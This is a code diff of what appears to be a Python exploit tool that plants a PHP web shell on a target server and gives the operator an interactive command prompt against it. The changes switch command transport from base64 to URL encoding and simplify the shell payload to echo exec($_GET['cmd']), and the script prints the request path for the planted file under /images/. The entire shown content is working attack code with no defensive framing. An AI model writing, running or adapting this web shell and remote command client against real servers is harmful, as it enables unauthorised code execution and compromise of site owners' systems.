@@ -8,7 +8,7 @@
 
 from argparse import ArgumentParser,SUPPRESS
 import requests,sys,ctypes,os
-from base64 import b64encode
+from urllib import parse
 
 def help():
     print("There are 2 uses:\n")
@@ -26,10 +26,11 @@ def AdminPrivs():
 def executeCode():
     global filename
     global images_url
+    print(f"Request => http://{target}/images/{filename}?cmd=<yourcommand>")
     print("Ctrl+c to exit")
     while(True):
         command = input("$ ")
-        url = f"{images_url}/{filename}?cmd={b64encode(command.encode()).decode()}"
+        url = f"{images_url}/{filename}?cmd={parse.quote_plus(command)}"
         rsp = requests.get(url)
         print(rsp.text)
 
@@ -117,7 +118,7 @@ system($cmd);
 ?>
 """
 rce_payload = f'''<?php
-echo exec(base64_decode($_GET['cmd']));
+echo exec($_GET['cmd']);
 ?>'''
 
 # Establish payload based on user choice
